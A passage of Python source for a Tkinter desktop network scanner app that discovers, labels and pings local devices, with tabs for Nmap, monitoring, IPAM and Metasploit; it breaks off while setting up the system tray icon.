#!/usr/bin/env python3
"""
YaP Network Scanner
Desktop application to discover and configure devices on your network.
"""

import sys
import os
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
import threading
import subprocess
import getpass
import time
import re
from typing import Optional, List, Dict
from network_scanner import NetworkScanner, NetworkDevice
from device_storage import DeviceStorage

# Try to import PIL for icon support
try:
    from PIL import Image, ImageTk
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# Try to import pystray for system tray support
try:
    import pystray
    HAS_PYSTRAY = True
except ImportError:
    HAS_PYSTRAY = False


class NetworkManagerGUI:
    """Main GUI application for network management."""
    
    def __init__(self, root):
        self.root = root
        self.root.title("YaP Network Scanner")
        self.root.geometry("1600x1000")
        self.root.minsize(1400, 900)
        self.root.resizable(True, True)
        self.root.minsize(1000, 650)
        
        # System tray support
        self.tray_icon = None
        self.tray_thread = None
        self.hidden_to_tray = False
        
        # Configure modern styling
        style = ttk.Style()
        style.theme_use('clam')
        
        # Initialize components
        self.scanner = NetworkScanner()
        self.scanner.set_progress_callback(self.on_scan_progress)
        self.scanner.set_password_callback(self.request_sudo_password)  # Set password callback
        self.storage = DeviceStorage()
        
        # Device list
        self.devices: Dict[str, NetworkDevice] = {}
        self.selected_device: Optional[NetworkDevice] = None
        
        # Setup UI
        self.create_widgets()
        
        # Load saved devices
        self.load_saved_devices()
        
        # Center window
        self.center_window()
        
        # Set window icon
        self.root.after_idle(self._set_window_icon)
        
        # Setup system tray if available
        if HAS_PYSTRAY:
            self.setup_system_tray()
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def _set_window_icon(self):
        """Set the window icon from icon file (non-blocking)."""
        def _load_icon():
            try:
                # Try to find yapnetworkscanner.png in multiple locations
                # Handle both normal execution and PyInstaller bundled execution
                if getattr(sys, 'frozen', False):
                    # Running as bundled executable
                    if hasattr(sys, '_MEIPASS'):
                        base_paths = [sys._MEIPASS, os.path.dirname(sys.executable)]
                    else:
                        base_paths = [os.path.dirname(sys.executable)]
                else:
                    # Normal Python execution
                    base_paths = [
                        os.path.dirname(os.path.dirname(__file__)),
                        os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                        os.path.dirname(__file__)
                    ]
                
                icon_paths = []
                for base in base_paths:
                    icon_paths.extend([
                        os.path.join(base, "yapnetworkscanner.png"),
                        os.path.join(base, "icon.png"),
                        os.path.join(base, "yaplab.png"),
                    ])
                
                icon_path = None
                for path in icon_paths:
                    if os.path.exists(path):
                        icon_path = path
                        break
                
                if icon_path and HAS_PIL:
                    try:
                        img = Image.open(icon_path)
                        self.icon_img = ImageTk.PhotoImage(img)
                        self.root.iconphoto(True, self.icon_img)
                    except:
                        pass
            except Exception:
                pass
        
        # Load icon in thread to avoid blocking
        threading.Thread(target=_load_icon, daemon=True).start()
    
    def center_window(self):
        """Center the window on the primary monitor."""
        self.root.update_idletasks()
        window_width = self.root.winfo_width()
        window_height = self.root.winfo_height()
        
        try:
            import subprocess
            result = subprocess.run(['xrandr', '--query'], 
                                  capture_output=True, text=True, timeout=1)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'primary' in line.lower() and 'connected' in line.lower():
                        import re
                        match = re.search(r'(\d+)x(\d+)\+(\d+)\+(\d+)', line)
                        if match:
                            primary_width = int(match.group(1))
                            primary_height = int(match.group(2))
                            primary_x = int(match.group(3))
                            primary_y = int(match.group(4))
                            x = primary_x + (primary_width // 2) - (window_width // 2)
                            y = primary_y + (primary_height // 2) - (window_height // 2)
                            self.root.geometry(f"+{x}+{y}")
                            return
        except:
            pass
        
        # Fallback
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)
        self.root.geometry(f"+{x}+{y}")
    
    def create_widgets(self):
        """Create GUI widgets."""
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Title with icon - centered and modern
        title_frame = ttk.Frame(main_frame)
        title_frame.pack(pady=(0, 10))
        
        # Try to load and display icon above title
        if HAS_PIL:
            try:
                if getattr(sys, 'frozen', False):
                    if hasattr(sys, '_MEIPASS'):
                        base_paths = [sys._MEIPASS, os.path.dirname(sys.executable)]
                    else:
                        base_paths = [os.path.dirname(sys.executable)]
                else:
                    base_paths = [
                        os.path.dirname(os.path.dirname(__file__)),
                        os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                        os.path.dirname(__file__)
                    ]
                
                icon_paths = []
                for base in base_paths:
                    icon_paths.extend([
                        os.path.join(base, "yapnetworkscanner.png"),
                        os.path.join(base, "icon.png"),
                        os.path.join(base, "yaplab.png"),
                    ])
                
                icon_path = None
                for path in icon_paths:
                    if os.path.exists(path):
                        icon_path = path
                        break
                
                if icon_path:
                    img = Image.open(icon_path)
                    img.thumbnail((64, 64), Image.Resampling.LANCZOS)
                    self.title_icon_img = ImageTk.PhotoImage(img)
                    icon_label = ttk.Label(title_frame, image=self.title_icon_img)
                    icon_label.pack(pady=(0, 6))
            except Exception:
                pass
        
        title_label = ttk.Label(
            title_frame,
            text="YaP Network Scanner",
            font=("Segoe UI", 16, "bold")
        )
        title_label.pack()
        
        subtitle_label = ttk.Label(
            title_frame,
            text="Discover and Configure Network Devices",
            font=("Segoe UI", 9),
            foreground="#666666"
        )
        subtitle_label.pack(pady=(3, 0))
        
        # Main content area with tabs
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        self.notebook = notebook  # Store reference for tab selection handling
        
        # Tab 1: Network Scan
        scan_tab = ttk.Frame(notebook, padding="5")
        notebook.add(scan_tab, text="Network Scan")
        
        # Tab 2: Nmap Scanner
        nmap_tab = ttk.Frame(notebook, padding="5")
        notebook.add(nmap_tab, text="Nmap Scanner")
        
        # Tab 3: Network Monitoring
        monitoring_tab = ttk.Frame(notebook, padding="5")
        notebook.add(monitoring_tab, text="Network Monitoring")
        
        # Tab 4: IP Address Management
        ipam_tab = ttk.Frame(notebook, padding="5")
        notebook.add(ipam_tab, text="IPAM")
        
        # Tab 5: Network Mapping
        mapping_tab = ttk.Frame(notebook, padding="5")
        notebook.add(mapping_tab, text="Network Mapping")
        
        # Tab 6: Configuration Management
        config_tab = ttk.Frame(notebook, padding="5")
        notebook.add(config_tab, text="Config Management")
        self.config_tab_index = notebook.index(config_tab)  # Store config tab index
        
        # Tab 7: Bandwidth Analysis
        bandwidth_tab = ttk.Frame(notebook, padding="5")
        notebook.add(bandwidth_tab, text="Bandwidth Analysis")
        
        # Tab 8: Security Management
        security_tab = ttk.Frame(notebook, padding="5")
        notebook.add(security_tab, text="Security")
        
        # Tab 9: Troubleshooting
        troubleshooting_tab = ttk.Frame(notebook, padding="5")
        notebook.add(troubleshooting_tab, text="Troubleshooting")
        
        # Tab 10: Reporting
        reporting_tab = ttk.Frame(notebook, padding="5")
        notebook.add(reporting_tab, text="Reporting")
        
        # Tab 11: Metasploit Framework
        metasploit_tab = ttk.Frame(notebook, padding="5")
        notebook.add(metasploit_tab, text="Metasploit")
        
        # Tab 12: Metasploit Help
        metasploit_help_tab = ttk.Frame(notebook, padding="5")
        notebook.add(metasploit_help_tab, text="Metasploit Help")
        
        # Top frame with scan controls (in scan tab)
        scan_frame = ttk.LabelFrame(scan_tab, text="Network Scan", padding="10")
        scan_frame.pack(fill=tk.X, pady=(0, 10))
        scan_frame.columnconfigure(1, weight=1)
        scan_frame.columnconfigure(4, weight=1)
        
        # Row 0: Network and buttons
        ttk.Label(scan_frame, text="Network:", font=("Segoe UI", 9)).grid(row=0, column=0, sticky=tk.W, padx=(0, 5), pady=2)
        self.network_var = tk.StringVar()
        network_combo = ttk.Combobox(scan_frame, textvariable=self.network_var, width=22, font=("Consolas", 9))
        network_combo.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(0, 5), pady=2)
        self.network_combo = network_combo
        
        # Bind network change to update subnet mask (compatible with both old and new trace methods)
        try:
            # Python 3.7+ uses trace_add
            self.network_var.trace_add('write', lambda *args: self.update_subnet_mask_display())
        except AttributeError:
            # Older Python uses trace
            self.network_var.trace('w', lambda *args: self.update_subnet_mask_display())
        
        # Also bind to combobox selection
        network_combo.bind('<<ComboboxSelected>>', lambda e: self.update_subnet_mask_display())
        network_combo.bind('<Return>', lambda e: self.update_subnet_mask_display())
        
        # Subnet mask display (inline with network)
        ttk.Label(scan_frame, text="Subnet:", font=("Segoe UI", 9)).grid(row=0, column=2, sticky=tk.W, padx=(10, 5), pady=2)
        self.subnet_mask_label = ttk.Label(scan_frame, text="N/A", font=("Consolas", 9), foreground="#666666")
        self.subnet_mask_label.grid(row=0, column=3, sticky=tk.W, padx=(0, 10), pady=2)
        
        # Buttons
        ttk.Button(scan_frame, text="Auto-Detect", command=self.auto_detect_network).grid(row=0, column=4, padx=(0, 5), pady=2)
        self.scan_btn = ttk.Button(scan_frame, text="Scan Network", command=self.start_scan)
        self.scan_btn.grid(row=0, column=5, padx=(0, 5), pady=2)
        self.stop_btn = ttk.Button(scan_frame, text="Stop", command=self.stop_scan, state="disabled")
        self.stop_btn.grid(row=0, column=6, padx=(0, 0), pady=2)
        
        # Row 1: Ports to scan
        ttk.Label(scan_frame, text="Ports:", font=("Segoe UI", 9)).grid(row=1, column=0, sticky=tk.W, padx=(0, 5), pady=2)
        self.ports_var = tk.StringVar()
        ports_entry = ttk.Entry(scan_frame, textvariable=self.ports_var, width=22, 
                                font=("Consolas", 9))
        ports_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), padx=(0, 5), pady=2)
        self.ports_entry = ports_entry
        
        # Ports hint (more compact)
        ports_hint = ttk.Label(scan_frame, 
                              text="(e.g., 80,443,8080-8090 or empty for common)", 
                              font=("Segoe UI", 8), foreground="#666666")
        ports_hint.grid(row=1, column=2, columnspan=5, sticky=tk.W, padx=(10, 0), pady=2)
        
        # Progress label
        self.progress_label = ttk.Label(scan_frame, text="", foreground="#0066CC", font=("Segoe UI", 9))
        self.progress_label.grid(row=2, column=0, columnspan=7, sticky=tk.W, pady=(3, 0))
        
        # Content frame for scan tab
        content_frame = ttk.Frame(scan_tab)
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        # Left panel - Device list
        left_panel = ttk.LabelFrame(content_frame, text="Discovered Devices", padding="10")
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 8))
        
        # Device list with scrollbar
        list_frame = ttk.Frame(left_panel)
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Treeview for device list
        columns = ('Label', 'IP', 'Hostname', 'Status', 'Vendor')
        self.device_tree = ttk.Treeview(list_frame, columns=columns, show='tree headings', 
                                       yscrollcommand=scrollbar.set, height=25)
        self.device_tree.heading('#0', text='#')
        self.device_tree.heading('Label', text='Label')
        self.device_tree.heading('IP', text='IP Address')
        self.device_tree.heading('Hostname', text='Hostname')
        self.device_tree.heading('Status', text='Status')
        self.device_tree.heading('Vendor', text='Vendor')
        
        self.device_tree.column('#0', width=40)
        self.device_tree.column('Label', width=150)
        self.device_tree.column('IP', width=130)
        self.device_tree.column('Hostname', width=160)
        self.device_tree.column('Status', width=80)
        self.device_tree.column('Vendor', width=160)
        
        self.device_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.device_tree.yview)
        
        self.device_tree.bind('<<TreeviewSelect>>', self.on_device_select)
        
        # Device list buttons
        list_buttons = ttk.Frame(left_panel)
        list_buttons.pack(fill=tk.X, pady=(6, 0))
        
        ttk.Button(list_buttons, text="Refresh", command=self.refresh_device_list).pack(side=tk.LEFT, padx=(0, 4))
        ttk.Button(list_buttons, text="Save Selected", command=self.save_selected_device).pack(side=tk.LEFT, padx=(0, 4))
        ttk.Button(list_buttons, text="Delete Selected", command=self.delete_selected_device).pack(side=tk.LEFT)
        
        # Right panel - Device details and configuration
        right_panel = ttk.LabelFrame(content_frame, text="Device Details & Configuration", padding="10")
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(8, 0))
        right_panel.columnconfigure(1, weight=1)
        
        # Device info
        info_frame = ttk.LabelFrame(right_panel, text="Device Information", padding="10")
        info_frame.pack(fill=tk.X, pady=(0, 10))
        info_frame.columnconfigure(1, weight=1)
        
        row = 0
        ttk.Label(info_frame, text="Label:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_label = ttk.Label(info_frame, text="N/A", font=("Segoe UI", 9))
        self.info_label.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        ttk.Label(info_frame, text="IP Address:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_ip = ttk.Label(info_frame, text="N/A", font=("Consolas", 9))
        self.info_ip.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        ttk.Label(info_frame, text="MAC Address:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_mac = ttk.Label(info_frame, text="N/A", font=("Consolas", 9))
        self.info_mac.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        ttk.Label(info_frame, text="Hostname:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_hostname = ttk.Label(info_frame, text="N/A", font=("Segoe UI", 9))
        self.info_hostname.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        ttk.Label(info_frame, text="Vendor:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_vendor = ttk.Label(info_frame, text="N/A", font=("Segoe UI", 9))
        self.info_vendor.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        ttk.Label(info_frame, text="Status:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_status = ttk.Label(info_frame, text="N/A", font=("Segoe UI", 9))
        self.info_status.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        ttk.Label(info_frame, text="Subnet Mask:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_subnet = ttk.Label(info_frame, text="N/A", font=("Consolas", 9))
        self.info_subnet.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        ttk.Label(info_frame, text="Open Ports:", font=("Segoe UI", 9, "bold")).grid(row=row, column=0, sticky=tk.W, pady=1)
        self.info_ports = ttk.Label(info_frame, text="N/A", font=("Consolas", 8), wraplength=350)
        self.info_ports.grid(row=row, column=1, sticky=tk.W, padx=(8, 0), pady=1)
        row += 1
        
        # Configuration frame
        config_frame = ttk.LabelFrame(right_panel, text="Device Configuration", padding="10")
        config_frame.pack(fill=tk.BOTH, expand=True)
        config_frame.columnconfigure(1, weight=1)
        
        # Device label
        ttk.Label(config_frame, text="Device Label:", font=("Segoe UI", 9, "bold")).grid(row=0, column=0, sticky=tk.W, pady=3)
        self.custom_name_var = tk.StringVar()
        label_entry = ttk.Entry(config_frame, textvariable=self.custom_name_var, font=("Segoe UI", 9))
        label_entry.grid(row=0, column=1, sticky=(tk.W, tk.E), padx=(8, 0), pady=3)
        label_entry.bind('<Return>', lambda e: self.save_device_config())
        ttk.Label(config_frame, text="(e.g., 'Living Room TV', 'Office Printer')", 
                 font=("Segoe UI", 8), foreground="#666666").grid(row=1, column=1, sticky=tk.W, padx=(8, 0), pady=(0, 3))
        
        # Notes
        ttk.Label(config_frame, text="Notes:", font=("Segoe UI", 9, "bold")).grid(row=2, column=0, sticky=(tk.W, tk.N), pady=3)
        self.notes_text = scrolledtext.ScrolledText(config_frame, height=8, width=35, wrap=tk.WORD, font=("Segoe UI", 9))
        self.notes_text.grid(row=2, column=1, sticky=(tk.W, tk.E, tk.N, tk.S), padx=(8, 0), pady=3)
        config_frame.rowconfigure(2, weight=1)
        
        # Action buttons
        action_frame = ttk.Frame(config_frame)
        action_frame.grid(row=3, column=0, columnspan=2, pady=(6, 0))
        
        ttk.Button(action_frame, text="Ping Device", command=self.ping_device).pack(side=tk.LEFT, padx=(0, 4))
        ttk.Button(action_frame, text="Open in Browser", command=self.open_in_browser).pack(side=tk.LEFT, padx=(0, 4))
        ttk.Button(action_frame, text="Save Configuration", command=self.save_device_config).pack(side=tk.LEFT)
        
        # Footer for scan tab
        footer_label = ttk.Label(
            scan_tab,
            text="© YaP Labs",
            font=("Segoe UI", 8),
            foreground="#999999"
        )
        footer_label.pack(side=tk.BOTTOM, pady=(5, 0))
        
        # Create all tab contents
        self.create_nmap_tab(nmap_tab)
        self.create_monitoring_tab(monitoring_tab)
        self.create_ipam_tab(ipam_tab)
        self.create_network_mapping_tab(mapping_tab)
        self.create_config_management_tab(config_tab)
        self.create_bandwidth_tab(bandwidth_tab)
        self.create_security_tab(security_tab)
        self.create_metasploit_tab(metasploit_tab)
        self.create_metasploit_help_tab(metasploit_help_tab)
        self.create_troubleshooting_tab(troubleshooting_tab)
        self.create_reporting_tab(reporting_tab)
        
        # Bind tab selection to refresh config device list when config tab is selected
        def on_tab_changed(event):
            try:
                selected_index = notebook.index(notebook.select())
                if selected_index == self.config_tab_index:
                    self.refresh_config_device_list()
                    self.view_config_history()
            except:
                pass
        
        notebook.bind('<<NotebookTabChanged>>', on_tab_changed)
    
    def update_subnet_mask_display(self, network_cidr: str = None):
        """Update the subnet mask display based on the network CIDR."""
        if network_cidr is None:
            network_cidr = self.network_var.get().strip()
        
        if not network_cidr:
            self.subnet_mask_label.config(text="N/A")
            return
        
        try:
            import ipaddress
            network = ipaddress.IPv4Network(network_cidr, strict=False)
            prefix = network.prefixlen
            mask = (0xffffffff >> (32 - prefix)) << (32 - prefix)
            import socket
            import struct
            subnet_mask = socket.inet_ntoa(struct.pack("!I", mask))
            self.subnet_mask_label.config(text=subnet_mask, foreground="#0066CC")
        except:
            self.subnet_mask_label.config(text="Invalid", foreground="#CC0000")
    
    def auto_detect_network(self):
        """Auto-detect the local network."""
        network = self.scanner.get_local_network()
        if network:
            self.network_var.set(network)
            self.update_subnet_mask_display(network)
            self.progress_label.config(text=f"Detected network: {network}", foreground="#00AA00")
        else:
            messagebox.showwarning("Network Detection", "Could not auto-detect network. Please enter network CIDR manually (e.g., 192.168.1.0/24)")
    
    def start_scan(self):
        """Start network scan."""
        network = self.network_var.get().strip()
        if not network:
            messagebox.showwarning("Network Required", "Please select or enter a network to scan (e.g., 192.168.1.0/24)")
            return
        
        # Validate network format
        try:
            import ipaddress
            ipaddress.IPv4Network(network, strict=False)
            # Update subnet mask display
            self.update_subnet_mask_display(network)
        except:
            messagebox.showerror("Invalid Network", f"Invalid network format: {network}\n\nPlease use CIDR notation (e.g., 192.168.1.0/24)")
            return
        
        # Parse ports
        ports_string = self.ports_var.get().strip()
        custom_ports = None
        if ports_string:
            try:
                custom_ports = self.scanner.parse_ports(ports_string)
                if not custom_ports:
                    messagebox.showwarning("Invalid Ports", "No valid ports found. Please check your port format.\n\nExamples:\n- Single: 80,443,22\n- Range: 8080-8090\n- Mixed: 80,443,8080-8090")
                    return
                if len(custom_ports) > 1000:
                    result = messagebox.askyesno("Many Ports", 
                                               f"You're about to scan {len(custom_ports)} ports per device.\n"
                                               f"This may take a very long time.\n\n"
                                               f"Continue anyway?")
                    if not result:
                        return
            except Exception as e:
                messagebox.showerror("Port Parse Error", f"Error parsing ports: {str(e)}\n\nPlease check your port format.")
                return
        
        # Disable scan button, enable stop button
        self.scan_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        
        # Clear device list
        self.device_tree.delete(*self.device_tree.get_children())
        self.devices.clear()
        
        # Start scan in thread
        def scan_thread():
            devices = self.scanner.scan_network(network, quick=False, max_threads=50, 
                                              custom_ports=custom_ports)
            self.root.after(0, lambda: self.on_scan_complete(devices))
        
        threading.Thread(target=scan_thread, daemon=True).start()
    
    def stop_scan(self):
        """Stop network scan."""
        self.scanner.stop_scan()
        self.scan_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.progress_label.config(text="Scan stopped by user", foreground="#CC0000")
    
    def request_sudo_password(self) -> Optional[str]:
        """Request sudo password from user via dialog."""
        # Create a custom password dialog
        dialog = tk.Toplevel(self.root)
        dialog.title("Root Password Required")
        dialog.geometry("400x150")
        dialog.resizable(False, False)
        dialog.transient(self.root)
        dialog.grab_set()  # Make dialog modal
        
        # Center the dialog on the same monitor as the main window
        dialog.update_idletasks()
        
        # Get main window position
        main_x = self.root.winfo_x()
        main_y = self.root.winfo_y()
        main_width = self.root.winfo_width()
        main_height = self.root.winfo_height()
        
        # Calculate center of main window
        center_x = main_x + (main_width // 2)
        center_y = main_y + (main_height // 2)
        
        # Position dialog centered on main window
        dialog_width = dialog.winfo_width()
        dialog_height = dialog.winfo_height()
        x = center_x - (dialog_width // 2)
        y = center_y - (dialog_height // 2)
        
        # Ensure dialog stays on screen (in case main window is partially off-screen)
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        
        # Get the monitor where the main window is located
        # For multi-monitor setups, we need to ensure dialog appears on same monitor
        if x < 0:
            x = main_x + 50  # Offset from main window if too far left
        if y < 0:
            y = main_y + 50  # Offset from main window if too far up
        if x + dialog_width > screen_width:
            x = screen_width - dialog_width - 10
        if y + dialog_height > screen_height:
            y = screen_height - dialog_height - 10
        
        dialog.geometry(f"+{x}+{y}")
        
        password_var = tk.StringVar()
        result = {'password': None}
        
        # Message
        msg_frame = ttk.Frame(dialog, padding="10")
        msg_frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(msg_frame, text="Nmap SYN scan requires root privileges.\nPlease enter your password:", 
                 justify=tk.LEFT).pack(pady=(0, 10))
        
        # Password entry
        entry_frame = ttk.Frame(msg_frame)
        entry_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(entry_frame, text="Password:").pack(side=tk.LEFT, padx=(0, 5))
        password_entry = ttk.Entry(entry_frame, textvariable=password_var, show="*", width=30)
        password_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        password_entry.focus()
        
        # Buttons
        button_frame = ttk.Frame(msg_frame)
        button_frame.pack(fill=tk.X)
        
        def on_ok():
            result['password'] = password_var.get()
            dialog.destroy()
        
        def on_cancel():
            result['password'] = None
            dialog.destroy()
        
        ttk.Button(button_frame, text="OK", command=on_ok, width=10).pack(side=tk.RIGHT, padx=(5, 0))
        ttk.Button(button_frame, text="Cancel", command=on_cancel, width=10).pack(side=tk.RIGHT)
        
        # Handle Enter key
        password_entry.bind('<Return>', lambda e: on_ok())
        dialog.bind('<Escape>', lambda e: on_cancel())
        
        # Wait for dialog to close
        dialog.wait_window()
        
        return result['password']
    
    def on_scan_progress(self, message: str):
        """Handle scan progress updates."""
        self.root.after(0, lambda: self.progress_label.config(text=message, foreground="#0066CC"))
    
    def on_scan_complete(self, devices: List[NetworkDevice]):
        """Handle scan completion."""
        self.scan_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        
        # Load saved devices to preserve labels
        saved_devices = self.storage.load_all_devices()
        
        # Update device list, preserving labels from saved devices
        for device in devices:
            # If device was previously saved, restore its label
            if device.ip in saved_devices:
                saved_data = saved_devices[device.ip]
                device.custom_label = saved_data.get('custom_label', '')
            
            self.devices[device.ip] = device
            self.add_device_to_tree(device)
        
        count = len(devices)
        self.progress_label.config(
            text=f"Scan complete! Found {count} device(s)",
            foreground="#00AA00"
        )
    
    def add_device_to_tree(self, device: NetworkDevice):
        """Add a device to the treeview."""
        # Check if device already exists (update it)
        # IP is now at index 1 (Label is at index 0)
        existing_item = None
        for item in self.device_tree.get_children():
            if self.device_tree.item(item, 'values')[1] == device.ip:
                existing_item = item
                break
        
        label = device.custom_label if device.custom_label else ""
        values = (label, device.ip, device.hostname, device.status, device.vendor)
        
        if existing_item:
            # Update existing item
            self.device_tree.item(existing_item, values=values)
        else:
            # Add new item
            item_id = self.device_tree.insert('', tk.END, text=str(len(self.device_tree.get_children()) + 1),
                                              values=values)
            self.device_tree.set(item_id, 'IP', device.ip)
    
    def refresh_device_list(self):
        """Refresh the device list display."""
        self.device_tree.delete(*self.device_tree.get_children())
        for device in self.devices.values():
            self.add_device_to_tree(device)
    
    def on_device_select(self, event):
        """Handle device selection."""
        selection = self.device_tree.selection()
        if not selection:
            return
        
        item = selection[0]
        # IP is now at index 1 (Label is at index 0)
        ip = self.device_tree.item(item, 'values')[1]
        device = self.devices.get(ip)
        
        if device:
            self.selected_device = device
            self.update_device_info(device)
            self.load_device_config(device)
    
    def update_device_info(self, device: NetworkDevice):
        """Update device information display."""
        # Display label (or "No label" if empty)
        label_text = device.custom_label if device.custom_label else "No label set"
        self.info_label.config(text=label_text, 
                              foreground="#0066CC" if device.custom_label else "#999999")
        self.info_ip.config(text=device.ip)
        self.info_mac.config(text=device.mac)
        self.info_hostname.config(text=device.hostname)
        self.info_vendor.config(text=device.vendor)
        self.info_status.config(text=device.status, 
                               foreground="#00AA00" if device.status == "Online" else "#CC0000")
        self.info_subnet.config(text=device.subnet_mask)
        
        if device.open_ports:
            ports_str = ", ".join(map(str, device.open_ports))
            self.info_ports.config(text=ports_str)
        else:
            self.info_ports.config(text="None detected")
    
    def load_device_config(self, device: NetworkDevice):
        """Load device configuration."""
        # Load label from device
        self.custom_name_var.set(device.custom_label if device.custom_label else "")
        
        # Load notes if we add notes support later
        # For now, just clear notes
        self.notes_text.delete(1.0, tk.END)
    
    def save_selected_device(self):
        """Save the selected device."""
        if not self.selected_device:
            messagebox.showwarning("No Selection", "Please select a device from the list.")
            return
        
        if self.storage.save_device(self.selected_device):
            messagebox.showinfo("Success", f"Device {self.selected_device.ip} saved successfully!")
        else:
            messagebox.showerror("Error", "Failed to save device.")
    
    def delete_selected_device(self):
        """Delete the selected device."""
        selection = self.device_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a device to delete.")
            return
        
        item = selection[0]
        # IP is now at index 1 (Label is at index 0)
        ip = self.device_tree.item(item, 'values')[1]
        
        result = messagebox.askyesno("Confirm Delete", f"Delete device {ip}?")
        if result:
            if ip in self.devices:
                del self.devices[ip]
            self.storage.delete_device(ip)
            self.device_tree.delete(item)
            self.selected_device = None
            self.clear_device_info()
    
    def clear_device_info(self):
        """Clear device information display."""
        self.info_label.config(text="N/A")
        self.info_ip.config(text="N/A")
        self.info_mac.config(text="N/A")
        self.info_hostname.config(text="N/A")
        self.info_vendor.config(text="N/A")
        self.info_status.config(text="N/A")
        self.info_subnet.config(text="N/A")
        self.info_ports.config(text="N/A")
        self.custom_name_var.set("")
        self.notes_text.delete(1.0, tk.END)
    
    def save_device_config(self):
        """Save device configuration."""
        if not self.selected_device:
            messagebox.showwarning("No Selection", "Please select a device first.")
            return
        
        # Update device with label
        label = self.custom_name_var.get().strip()
        self.selected_device.custom_label = label
        
        # Save device
        if self.storage.save_device(self.selected_device):
            # Update device in our list
            self.devices[self.selected_device.ip] = self.selected_device
            
            # Refresh the tree to show updated label
            self.refresh_device_list()
            
            # Reselect the device
            # IP is now at index 1 (Label is at index 0)
            for item in self.device_tree.get_children():
                if self.device_tree.item(item, 'values')[1] == self.selected_device.ip:
                    self.device_tree.selection_set(item)
                    self.device_tree.see(item)
                    break
            
            messagebox.showinfo("Success", f"Label saved for {self.selected_device.ip}!")
        else:
            messagebox.showerror("Error", "Failed to save device configuration.")
    
    def ping_device(self):
        """Ping the selected device."""
        if not self.selected_device:
            messagebox.showwarning("No Selection", "Please select a device first.")
            return
        
        def ping_thread():
            result = self.scanner.ping_host(self.selected_device.ip)
            message = f"Device {self.selected_device.ip} is {'online' if result else 'offline'}"
            self.root.after(0, lambda: messagebox.showinfo("Ping Result", message))
        
        threading.Thread(target=ping_thread, daemon=True).start()
    
    def open_in_browser(self):
        """Open device in browser."""
        if not self.selected_device:
            messagebox.showwarning("No Selection", "Please select a device first.")
            return
        
        import webbrowser
        url = f"http://{self.selected_device.ip}"
        webbrowser.open(url)
    
    def load_saved_devices(self):
        """Load saved devices from storage."""
        saved_devices = self.storage.load_all_devices()
        for ip, device_data in saved_devices.items():
            device = NetworkDevice.from_dict(device_data)
            self.devices[ip] = device
            # Only add to tree if not already there (from a scan)
            # IP is now at index 1 (Label is at index 0)
            if ip not in [self.device_tree.item(item, 'values')[1] 
                          for item in self.device_tree.get_children()]:
                self.add_device_to_tree(device)
    
    def setup_system_tray(self):
        """Setup system tray icon."""
        if not HAS_PYSTRAY:
            return
        
        try:
            if getattr(sys, 'frozen', False):
                if hasattr(sys, '_MEIPASS'):
                    base_paths = [sys._MEIPASS, os.path.dirname(sys.executable)]
                else:
                    base_paths = [os.path.dirname(sys.executable)]
            else:
                base_paths = [
                    os.path.dirname(os.path.dirname(__file__)),
                    os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                ]
            
            icon_paths = []
            for base in base_paths:
                icon_paths.extend([
                    os.path.join(base, "yapnetworkscanner.png"),
                    os.path.join(base, "icon.png"),
                    os.path.join(base, "yaplab.png"),
                ])
            
            tray_image = None
            for path in icon_paths:
                if os.path.exists(path):
                    try:
                        tray_image = Image.open(path)
                        tray_image = tray_image.resize((64, 64), Image.Resampling.LANCZOS)
                        break
                    except:
                        pass
            
            if not tray_image:
                tray_image = Image.new('RGB', (64, 64), color='#0066CC')
            
            menu = pystray.Menu(
                pystray.MenuItem('Show Window', self.show_window),
                pystray.MenuItem('Quit', self.quit_application)
            )
            
